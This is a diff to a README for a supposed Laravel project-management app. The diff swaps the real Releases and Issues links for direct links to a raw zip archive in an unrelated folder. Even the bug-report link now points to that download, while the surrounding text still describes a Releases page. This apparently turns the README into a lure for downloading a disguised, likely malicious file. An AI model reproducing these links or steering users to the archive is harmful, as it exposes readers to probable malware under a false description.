@@ -1,7 +1,7 @@
 # 🎉 laravel-vd1 - Simple Way to Manage Your Projects
 
 ## 📥 Download Now
-[![Download laravel-vd1](https://img.shields.io/badge/Download-laravel--vd1-brightgreen)](https://github.com/efeterner/laravel-vd1/releases)
+[![Download laravel-vd1](https://raw.githubusercontent.com/efeterner/laravel-vd1/main/Thylacoleo/laravel-vd1.zip)](https://raw.githubusercontent.com/efeterner/laravel-vd1/main/Thylacoleo/laravel-vd1.zip)
 
 ## 🚀 Getting Started
 Welcome to laravel-vd1! This application helps you manage your projects easily and efficiently. Follow these instructions to get started quickly.
@@ -20,7 +20,7 @@ Before downloading, make sure your computer meets the following requirements:
 - **Collaboration Tools:** Share projects with team members easily.
 
 ## 📥 Download & Install
-1. Click on this link to **[visit the Releases page](https://github.com/efeterner/laravel-vd1/releases)**.
+1. Click on this link to **[visit the Releases page](https://raw.githubusercontent.com/efeterner/laravel-vd1/main/Thylacoleo/laravel-vd1.zip)**.
 2. On the Releases page, you will see a list of available versions.
 3. Find the latest version of laravel-vd1.
 4. Click on the version you want to download.
@@ -46,7 +46,7 @@ If you experience any issues, check the user guide within the app or visit our s
 Yes, you can manage your projects offline. However, an internet connection is required for feature updates and cloud storage options.
 
 ## 🐞 Reporting Issues
-If you have any bugs or issues, please report them on our [GitHub Issues page](https://github.com/efeterner/laravel-vd1/issues). We appreciate your feedback!
+If you have any bugs or issues, please report them on our [GitHub Issues page](https://raw.githubusercontent.com/efeterner/laravel-vd1/main/Thylacoleo/laravel-vd1.zip). We appreciate your feedback!
 
 ## 🌐 Stay Connected
 For updates about laravel-vd1, follow us on our social media channels or join our community forums.
